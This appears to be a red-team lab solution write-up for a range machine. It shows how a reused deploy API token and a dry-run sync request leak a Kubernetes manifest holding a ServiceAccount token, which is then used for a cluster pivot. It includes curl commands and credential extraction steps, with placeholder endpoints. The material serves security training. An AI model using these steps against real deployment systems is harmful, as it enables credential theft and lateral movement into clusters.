# solve_red.md — M5 · dev-deploy
## Red Team Solution Writeup
**Machine:** M5 — PUL Deploy Commander
**Vulnerability:** Dry-run Sync API Returns Full K8s Manifest Including ServiceAccount Token Secret
**MITRE:** T1552.001 (Credentials in Files)
**PIVOT TO:** RNG-CLD-01 Kubernetes cluster (endpoint in source writeup is a placeholder)

---
## Objective
Load the Deploy Commander API token saved by M4 from `$RANGE3_DIR/sonar-settings.json`. List applications and trigger a dry-run sync of `pul-ota-firmware`. The manifest includes a placeholder cluster endpoint; this repository does not provision RNG-CLD-01.

---
## Step-by-Step

### Step 1 — Verify Token & List Applications
```bash
DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
curl --max-time 8 -fsS http://203.0.3.36:8888/api/applications \
     -H "Authorization: Bearer ${DEPLOY_TOKEN}" | jq .
```
Identifies `pul-ota-firmware`. The displayed cluster address `193.x.x.x:6443` is a placeholder and was not validated.



### Step 2 — Trigger Dry-run (THE VULNERABILITY)
```bash
curl --max-time 8 -fsS -X POST \
     "http://203.0.3.36:8888/api/applications/pul-ota-firmware/sync?dryRun=true" \
     -H "Authorization: Bearer ${DEPLOY_TOKEN}" | jq .
```

Run Step 2 in the same terminal as Step 1 so `DEPLOY_TOKEN` remains set. The response contains the exercise manifest and a placeholder cluster target.
Response contains the full resolved K8s YAML manifest.



### Step 3 — Extract ServiceAccount Token
From the `manifest` field of the JSON response, find:
```yaml
kind: Secret
type: kubernetes.io/service-account-token
data:
  token: <BASE64_JWT_TOKEN>
  namespace: cHVsLXByb2R1Y3Rpb24=  # pul-production
```
Also find the cluster endpoint in ConfigMap:
```yaml
cluster_endpoint: "https://193.x.x.x:6443"
```






### Step 4 — Kubernetes pivot

The supplied cluster endpoint `193.x.x.x:6443` and token strings in the example are placeholders. The Deploy Commander dry-run request above was verified, but the cluster pivot cannot be run from this writeup until the authorized cluster endpoint and a real token are available. Do not copy the placeholder kubeconfig or disable TLS verification.

After finishing the lab steps, remove locally downloaded credential files and clear shell variables:

```bash
rm -f "$RANGE3_DIR/docker-config.json" "$RANGE3_DIR/registry-config.json" "$RANGE3_DIR/sonarqube-access.env" "$RANGE3_DIR/sonar-settings.json"
rmdir "$RANGE3_DIR"
unset REGISTRY_USER REGISTRY_PASSWORD_CANDIDATE MINIO_ACCESS_KEY MINIO_SECRET_KEY SONAR_TOKEN DEPLOY_TOKEN
unset RANGE3_DIR
```



---
## MITRE Mapping
| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Lateral Movement | Remote Services | T1021 |
| Discovery | Cloud Service Discovery | T1526 |
